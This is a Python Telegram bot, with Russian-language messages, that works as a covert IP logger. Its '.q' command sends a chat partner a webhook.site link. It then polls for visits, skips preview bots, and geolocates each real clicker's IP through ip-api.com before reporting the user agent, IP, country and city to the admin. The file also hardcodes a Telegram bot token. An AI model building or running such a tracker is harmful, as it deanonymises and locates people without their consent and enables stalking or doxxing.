import telebot
import requests
import time
import threading
import logging
from datetime import datetime, timedelta
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TOKEN") or "8667896660:AAErVVlBrGLf3bG_3YMRD5ZCK9HP0Hh1GWw"
bot = telebot.TeleBot(TOKEN)

ADMIN_ID = None
security_mode = False
active_links = {}

def get_msk_time():
    utc_now = datetime.utcnow()
    msk_now = utc_now + timedelta(hours=3)
    return msk_now.strftime("%H:%M:%S")

def is_telegram_preview(ua):
    if not ua: return False
    ua_lower = ua.lower()
    return any(word in ua_lower for word in ["telegrambot", "twitterbot", "bot", "preview", "crawler"])

def create_webhook_link():
    try:
        r = requests.post("https://webhook.site/token", timeout=10)
        r.raise_for_status()
        data = r.json()
        return f"https://webhook.site/{data['uuid']}", data['uuid']
    except:
        return None, None

def get_webhook_requests(token_id):
    try:
        url = f"https://webhook.site/token/{token_id}/requests?sorting=newest&limit=50"
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        return r.json().get("data", [])
    except:
        return []

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=8)
        data = r.json()
        if data.get("status") == "success":
            return data.get("country", "Неизвестно"), data.get("city", "Неизвестно")
    except:
        pass
    return "Неизвестно", "Неизвестно"

def deactivate_link(chat_id, msg_id):
    time.sleep(600)
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="🔴 Ссылка деактивирована")
    except:
        pass

def send_report(data):
    global ADMIN_ID
    if not ADMIN_ID: return

    ua = data.get("user_agent", "")
    ip = data.get("ip", "Неизвестно")

    if is_telegram_preview(ua):
        return  # Пропускаем ложные срабатывания

    country, city = get_geo(ip)

    report = f"""🔍 **Новый реальный переход!**

🖥 {ua}
📍 {ip}
🌍 {country}
🏙 {city}
🕒 {datetime.now().strftime("%H:%M:%S")}"""

    bot.send_message(ADMIN_ID, report, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def start(message):
    global ADMIN_ID
    if ADMIN_ID is None:
        ADMIN_ID = message.from_user.id
    bot.reply_to(message, "✅ Бот работает 24/7\n\n.q — ссылка\n/time — время")

@bot.message_handler(commands=['time', 'время'])
def time_command(message):
    name = message.from_user.first_name or message.from_user.username or "Пользователь"
    t = get_msk_time()
    if "[" in name and "]" in name:
        name = name.split("[")[0].strip()
    new_name = f"{name} [{t}]"
    bot.reply_to(message, f"**Скопируй:**\n`{new_name}`", parse_mode="Markdown")

@bot.message_handler(commands=['security'])
def security_cmd(message):
    global security_mode
    if "on" in message.text.lower():
        security_mode = True
        bot.reply_to(message, "🔒 Режим безопасности включён")
    else:
        security_mode = False
        bot.reply_to(message, "🔓 Режим безопасности выключен")

@bot.business_message_handler(func=lambda m: True)
def handle_business(message):
    global security_mode
    text = (message.text or "").strip()
    if text == ".q":
        if security_mode:
            markup = telebot.types.InlineKeyboardMarkup()
            markup.add(telebot.types.InlineKeyboardButton("✅ Да", callback_data=f"yes_{message.chat.id}"))
            bot.send_message(message.chat.id, "Отправить ссылку?", reply_markup=markup, business_connection_id=message.business_connection_id)
        else:
            process_q(message.chat.id, message.business_connection_id)

def process_q(chat_id, bc_id):
    link, token_id = create_webhook_link()
    if not link:
        return bot.send_message(chat_id, "❌ Ошибка", business_connection_id=bc_id)
    msg = bot.send_message(chat_id, link, business_connection_id=bc_id)
    global ADMIN_ID
    if ADMIN_ID:
        bot.send_message(ADMIN_ID, f"✅ Ссылка отправлена")
    threading.Thread(target=deactivate_link, args=(chat_id, msg.message_id), daemon=True).start()
    active_links[msg.message_id] = {"chat_id": chat_id, "token_id": token_id}

@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    if c.data.startswith("yes_"):
        chat_id = int(c.data.split("_")[1])
        process_q(chat_id, None)
        bot.delete_message(c.message.chat.id, c.message.message_id)

def monitor():
    while True:
        try:
            for mid in list(active_links.keys()):
                info = active_links[mid]
                reqs = get_webhook_requests(info["token_id"])
                for req in reqs:
                    if req.get("method") in ("GET", "POST"):
                        send_report(req)
                        active_links.pop(mid, None)
                        break
        except:
            pass
        time.sleep(8)

if __name__ == "__main__":
    threading.Thread(target=monitor, daemon=True).start()
    bot.infinity_polling(none_stop=True)
